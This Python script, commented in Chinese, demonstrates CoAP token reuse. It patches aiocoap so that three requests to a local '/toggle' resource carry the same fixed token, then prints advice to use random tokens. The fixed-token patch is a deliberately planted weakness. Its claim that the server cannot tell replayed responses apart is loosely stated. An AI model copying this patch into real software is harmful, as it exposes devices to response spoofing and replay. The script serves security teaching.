#!/usr/bin/env python3
"""
CoAP Token 重用攻击演示
展示如何使用相同的 Token 发送多个请求
"""

import asyncio
import logging
import functools
from aiocoap import *
from aiocoap import error
from aiocoap.tokenmanager import TokenManager
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("Token-Reuse-Attack")

# ============================================================
# Monkey Patch: 允许手动设置 Token
# ============================================================
def _patched_request(self, request):
    """修改后的 request 方法，允许保留手动设置的 Token"""
    if self.outgoing_requests is None:
        request.add_exception(error.LibraryShutdown())
        return

    msg = request.request
    assert msg.code.is_request(), "Message code is not valid for request"
    assert msg.remote is not None, "Remote not pre-populated"

    # ★ 只在 Token 为空时才分配新 Token
    if not msg.token:
        msg.token = self.next_token()
    
    self.log.debug("Sending request - Token: %s, Remote: %s", msg.token.hex(), msg.remote)

    if msg.remote.is_multicast:
        key = (msg.token, None)
    else:
        key = (msg.token, msg.remote)

    self.outgoing_requests[key] = request
    request.on_interest_end(functools.partial(self.outgoing_requests.pop, key, None))

    try:
        send_canceller = self.token_interface.send_message(
            msg, lambda: request.add_exception(error.MessageError)
        )
    except Exception as e:
        request.add_exception(e)
        return

    if send_canceller is not None:
        request.on_interest_end(send_canceller)

TokenManager.request = _patched_request
logger.info("✓ Monkey Patch 已应用 - 允许手动设置 Token")
# ============================================================

async def demonstrate_token_reuse_attack():
    """演示 Token 重用攻击"""
    
    print("\n" + "="*70)
    print("CoAP Token 重用攻击演示")
    print("="*70)
    print()
    print("攻击原理:")
    print("  1. 客户端使用固定或可预测的 Token")
    print("  2. 攻击者可以拦截并重放响应")
    print("  3. 服务器无法区分合法响应和重放响应")
    print()
    print("="*70)
    print()
    
    context = await Context.create_client_context()
    
    # 使用固定 Token（这是漏洞！）
    vulnerable_token = b'VULN_TOKEN'
    
    print(f"【漏洞】使用固定 Token: {vulnerable_token.hex()}")
    print()
    
    # 发送多个请求，都使用相同的 Token
    for i in range(1, 4):
        print(f"--- 请求 #{i} ---")
        msg = Message(
            code=Code.GET, 
            uri="coap://127.0.0.1:5683/toggle",
            _token=vulnerable_token  # 重用相同的 Token
        )
        
        try:
            response = await asyncio.wait_for(
                context.request(msg).response, 
                timeout=5.0
            )
            print(f"✓ 收到响应")
            print(f"  Token: {response.token.hex()}")
            print(f"  状态: {response.code}")
            print(f"  数据: {response.payload.decode()}")
            
            if response.token == vulnerable_token:
                print(f"  ⚠️  Token 被重用！")
            
        except asyncio.TimeoutError:
            print(f"✗ 超时")
        except Exception as e:
            print(f"✗ 错误: {e}")
        
        print()
        await asyncio.sleep(1)
    
    print("="*70)
    print("攻击演示完成")
    print()
    print("安全建议:")
    print("  ✓ 每个请求使用唯一的随机 Token")
    print("  ✓ Token 应该足够长（至少 4 字节）")
    print("  ✓ 使用加密安全的随机数生成器")
    print("="*70)
    
    await context.shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(demonstrate_token_reuse_attack())
    except KeyboardInterrupt:
        print("\n演示被中断")

